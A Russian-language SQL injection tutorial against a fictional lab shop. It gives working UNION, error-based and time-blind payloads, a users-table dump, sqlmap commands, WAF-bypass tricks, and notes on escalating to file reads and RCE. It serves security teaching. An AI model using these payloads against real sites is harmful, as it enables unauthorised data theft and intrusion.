## Вопрос, с которого всё начинается

Ты перешёл на страницу товара в интернет-магазине. В адресной строке — `?id=1`, на странице — «Футболка, 5000 ₽». Что если это число `1` сервер подставляет прямо в SQL-запрос к базе?

Тогда, добавив в URL пару символов, можно заставить базу **выполнить твой код** вместо того, чтобы просто найти товар. Такую дыру называют **SQL-инъекцией** (SQLi): ввод пользователя смешивается с кодом запроса и меняет его структуру. Сегодня мы возьмём один такой параметр и пройдём путь от «а вдруг?» до дампа таблицы пользователей.

## Наш пример

`shop.local` — интернет-магазин. Открываем товар:

```bash
$ curl -s 'https://shop.local/product?id=1'
<h1>Футболка</h1><span class="price">5000</span>
```

Сервер, скорее всего, выполнил что-то вроде:

```sql
SELECT name, price FROM products WHERE id = 1
```

Вопрос, который нас интересует: попадает ли значение `id` в этот запрос **как код** или **как данные**? Если как код — мы сможем его дописать.

## Шаг 1: кавычка как детектор

Самый простой признак — сломать синтаксис. Добавим к `id` одинарную кавычку:

```bash
$ curl -s 'https://shop.local/product?id=1%27'
<h1>Ошибка</h1>SQL syntax error near ''1''' at line 1
```

Кавычка попала в запрос и он «развалился» — база пожаловалась на синтаксис. Это первая зацепка: приложение собирает запрос конкатенацией строки, а не через **параметризованный запрос** (prepared statement), где ввод передаётся отдельно и структурой запроса управлять нельзя.

Обрати внимание: текст ошибки виден пользователю. Значит, у нас, возможно, есть не только инъекция, но и **error-based** вывод — ошибки базы помогут вытаскивать данные напрямую.

## Шаг 2: числовой контекст или строковый?

Прежде чем строить payload, надо понять, в каком «окружении» живёт наше число. Проверим логику: `id=1` даёт товар, а `id=2-1`?

```bash
$ curl -s 'https://shop.local/product?id=2-1'
<h1>Футболка</h1><span class="price">5000</span>
```

Если бы сервер ждал строку (`WHERE id='$x'`), то `2-1` было бы текстом `"2-1"` и товар не нашёлся бы. А раз вернулся тот же товар — сервер **посчитал** `2-1` как число. Контекст числовой: кавычки для payload не нужны.

Теперь соберём первое логическое условие: `id=1 AND 1=1` возвращает товар, `id=1 AND 1=2` — пусто.

```bash
$ curl -s 'https://shop.local/product?id=1 AND 1=2'
<h1>Товар не найден</h1>
```

Ответ **меняется** в зависимости от нашего условия. Это значит, что запрос управляем, и даже если вывод пропадёт, мы сможем играть в «да/нет» (boolean-blind).

## Шаг 3: сколько колонок в запросе?

Чтобы склеить свой результат с результатом приложения (техника **UNION**), нужно знать, сколько полей выбирает оригинальный запрос. Простой способ — `ORDER BY N`: увеличиваем N, пока запрос не упадёт.

```bash
$ curl -s 'https://shop.local/product?id=1 ORDER BY 2-- -'
<h1>Футболка</h1>...          # ок
$ curl -s 'https://shop.local/product?id=1 ORDER BY 3-- -'
<h1>Ошибка</h1>Unknown column '3' in 'order clause'
```

На `3` запрос сломался → в запросе **две колонки**. `-- -` — это комментарий (дефис, дефис, пробел): он «съедает» остаток оригинального запроса, чтобы наш хвост не мешал. В MySQL комментарию `--` обязательно нужен пробел после него, иначе он не сработает.

## Шаг 4: находим колонку, которая попадает на страницу

Теперь подставим UNION и посмотрим, какая из двух колонок реально отображается. Делаем оригинальный `id` несуществующим (`-1`), чтобы в выводе был только наш результат:

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,2-- -'
<h1>1</h1><span class="price">2</span>
```

Обе колонки видны. Возьмём вторую — именно в неё мы будем «вкладывать» данные базы.

## Шаг 5: версия и текущая база

Дальше действуем как разведчик: узнаём СУБД и базу.

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,version()-- -'
<h1>1</h1><span class="price">10.4.11-MariaDB</span>
```

МарияДБ — значит, синтаксис MySQL-семейства. Узнаём текущую базу через `database()`:

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,database()-- -'
<span class="price">shop</span>
```

Имя базы — `shop`. В каждой СУБД свои функции, поэтому этот шаг важен: `version()`, `database()` (MySQL), `@@version` (MSSQL), `current_database()` (Postgres) — если бы здесь был другой сервер, payload отличался бы.

## Шаг 6: таблицы, колонки, дамп

Список таблиц живёт в системной схеме `information_schema.tables`:

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -'
<span class="price">products,users,orders</span>
```

Есть таблица `users`. Смотрим её колонки:

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273-- -'
<span class="price">id,login,password_hash</span>
```

Обрати внимание на `0x7573657273`: вместо строки `'users'` мы передали её **hex-код**. Это пригодится, если приложение фильтрует кавычки (см. «На что смотреть дальше»). Теперь финальный шаг — дамп:

```bash
$ curl -s 'https://shop.local/product?id=-1 UNION SELECT 1,group_concat(login,0x3a,password_hash) FROM users-- -'
<span class="price">admin:5f4dcc3b5aa765d61d8327deb882cf99</span>
```

`0x3a` — это двоеточие-разделитель. В выводе — логин и хеш пароля администратора. Это и есть **доказательство** (артефакт): строка из таблицы, которую приложение показывать не должно.

## Шаг 7: когда вывода нет — blind

Бывает, что ошибки скрыты и данные на страницу не попадают. Тогда играем «вопрос-ответ» через задержку. Спрашиваем: «длина имени базы равна 4?»

```bash
$ curl -s -o /dev/null -w '%{time_total}\n' \
>   'https://shop.local/product?id=1 AND IF(LENGTH(database())=4,SLEEP(3),0)-- -'
3.01
```

Три секунды задержки — значит условие **истинно**, длина 4 (это `shop`). Так, символ за символом (`SUBSTRING`), вытягивают любые данные, даже когда страница отвечает одинаково. Это **time-based blind** — медленно, зато работает вслепую.

## Шаг 8: автоматизируем sqlmap

Руками такие циклы делать больно, поэтому есть **sqlmap**. Сохраняем запрос из Burp в файл `req.txt` (чтобы не терять cookie и заголовки) и запускаем:

```bash
$ sqlmap -r req.txt -p id --batch --dbs
[INFO] GET parameter 'id' is vulnerable
[*] information_schema
[*] shop
```

Подтвердили инъекцию и увидели базы. Дальше — то же, что мы делали руками, но одной командой:

```bash
$ sqlmap -r req.txt -p id -D shop -T users --dump
admin | 5f4dcc3b5aa765d61d8327deb882cf99
```

Ключевые флаги: `-r` — запрос из файла, `-p` — какой параметр тестировать, `--batch` — без интерактива, `-D/-T/--dump` — цель и что выгружать. Флаг `--technique=U` ограничит проверку только UNION (быстрее), `--level/--risk` повышают глубину и риск (на проде их не поднимай без согласия).

## Что мы теперь знаем

- SQLi возникает там, где ввод **склеивают** с запросом, а не передают как параметр.
- Кавычка ломает синтаксис — первый признак; видимая ошибка — сразу error-based.
- Число колонок находят через `ORDER BY N` (до падения запроса).
- `UNION SELECT` вклеивает свой результат, если совпало число колонок.
- `information_schema` хранит имена таблиц и колонок — с него начинают дамп.
- `group_concat` склеивает строки в одну, `0x…` заменяет кавычки.
- Когда вывода нет — boolean/time-blind: «да/нет» через ответ или задержку.
- sqlmap автоматизирует всё это, если дать ему сохранённый запрос.

## На что смотреть дальше

- Пробуй разные **контексты**: строка (`WHERE name='$x'` → `' OR 1=1-- -`), число (без кавычек), `LIKE`, `IN`, `ORDER BY`, `LIMIT`. Строковая обёртка в числовом контексте — самая частая ошибка новичка.
- Если `UNION SELECT` или кавычки блокируются фильтром — переходи на **обход**: `/**/` вместо пробелов, `UnIoN`/`SeLeCt` в разном регистре, hex/`CHAR()` вместо строк, `--` меняй на `#` или `/* */`. Для WAF — `sqlmap --tamper=space2comment,randomcase`.
- Данные могут не выводиться сразу: ищи **second-order** (сохранили — триггернули позже в другом запросе) и **OOB** (база сама делает DNS/HTTP-запрос наружу через `LOAD_FILE`).
- Если у пользователя БД есть права `FILE`/`INSERT` или `xp_cmdshell`/`COPY TO PROGRAM` — SQLi превращается в чтение файлов и RCE. Проверяй `sqlmap --privileges`, но помни про согласие.

## Куда дальше

В следующем уроке мы оставим базу данных и посмотрим на другой класс инъекций — **команды операционной системы**: там, где приложение передаёт ввод в `system()` или `exec()`, тот же принцип даёт уже полноценное выполнение кода на сервере. А пока главное запомни: если ввод меняет структуру запроса, ты им управляешь — от кавычки до дампа базы.

## Где пригодится

- **CTF (Web):** SQLi — топ-класс задач; флаг часто лежит в отдельной таблице или в файле, читаемом через БД.
- **Bug bounty:** SQLi критичны и оплачиваются максимально; даже blind-инъекция — валидный high/critical.
- **Пентест:** проверка всех параметров на SQLi входит в обязательный чеклист (OWASP A03: Injection).
- **Работа (AppSec):** ревью кода на конкатенацию SQL и внедрение prepared statements — прямая защита от этого класса.
